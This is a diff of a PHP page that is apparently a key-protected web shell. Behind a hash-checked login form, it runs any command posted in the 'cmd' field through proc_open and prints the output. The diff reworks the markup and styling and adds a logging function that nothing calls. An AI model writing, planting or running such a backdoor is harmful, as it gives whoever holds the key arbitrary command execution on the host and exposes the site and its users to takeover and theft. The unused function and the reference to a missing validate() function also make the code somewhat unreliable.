@@ -1,39 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
 <?php
 $hash = '68294cf2dcf09372f59e46bacf9e4fa2dc0822c0ed8d45b0b351f83789625b06';
 if (empty($_REQUEST['key']) || hash('sha256', $_REQUEST['key']) != $hash) {
-    echo ("Bad key!\n");
-    ?>
+    echo '<head><title>Log in</title></head><body>
         <form method="post">
-            <input type="text" name="key" value="<?=htmlspecialchars($_REQUEST['key'])?>"></input>
+            <input type="text" name="key" value="' . htmlspecialchars($_REQUEST['key']) . '"></input>
             <button type="submit">Log in</button>
-        </form>
-<?php
+        </form></body></html>';
     exit();
 }
 
-
-
 if (!empty($_POST['cmd'])) {
-
     $descriptorspec = array(
        0 => array("pipe", "r"),  // stdin
        1 => array("pipe", "w"),  // stdout
        2 => array("pipe", "w"),  // stderr
     );
-    
+
     // And, then, execute the test.sh command, using those descriptors, in the current directory, and saying the i/o should be from/to $pipes :
-    $process = proc_open($_POST['cmd'], $descriptorspec, $pipes, dirname(__FILE__), null);
-    
+    $pipes = null;
+    proc_open($_POST['cmd'], $descriptorspec, $pipes, dirname(__FILE__), null);
+
     // We can now read from the two output pipes :
     $stdout = stream_get_contents($pipes[1]);
     fclose($pipes[1]);
-    
     $stderr = stream_get_contents($pipes[2]);
     fclose($pipes[2]);
 }
+
+/**
+ * Build a string to describe the inoming query, and log it.
+ * @return string The data that was logged.
+ * Note: MUST NOT echo anything to headers or stdout, or validate() will break.
+ */
+function logCommand() {
+    $filename = 'inst-mwm.log';
+    $timestamp = date('Y-m-d H:i:s: ');
+    $data = $timestamp . $_POST['cmd'] . "\n";
+    file_put_contents($filename, $data, FILE_APPEND);
+    return $data;
+}
+
 ?>
-<!DOCTYPE html>
-<html lang="en">
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -59,12 +68,8 @@ if (!empty($_POST['cmd'])) {
         input,
         button {
             border-radius: 5px;
-        }
-
-        pre,
-        input,
-        button {
             background-color: #efefef;
+            padding: 10px;
         }
 
         label {
@@ -91,12 +96,6 @@ if (!empty($_POST['cmd'])) {
 
         button:hover {
             background-color: #e6e6e6;
-        }
-
-        pre,
-        input,
-        button {
-            padding: 10px;
         }
 
         .form-group {
@@ -128,13 +127,13 @@ if (!empty($_POST['cmd'])) {
             <?php if (isset($stdout)): ?>
                 <pre><?= htmlspecialchars($stdout, ENT_QUOTES, 'UTF-8') ?></pre>
             <?php else: ?>
-                <pre><small>No sdtout.</small></pre>
+                <p><small>No stdout.</small></p>
             <?php endif; ?>
             <h2>Errors</h2>
             <?php if (isset($stderr)): ?>
                 <pre><?= htmlspecialchars($stderr, ENT_QUOTES, 'UTF-8') ?></pre>
             <?php else: ?>
-                <pre><small>No sdterr.</small></pre>
+                <p><small>No stderr.</small></p>
             <?php endif; ?>
         <?php endif; ?>
     </main>
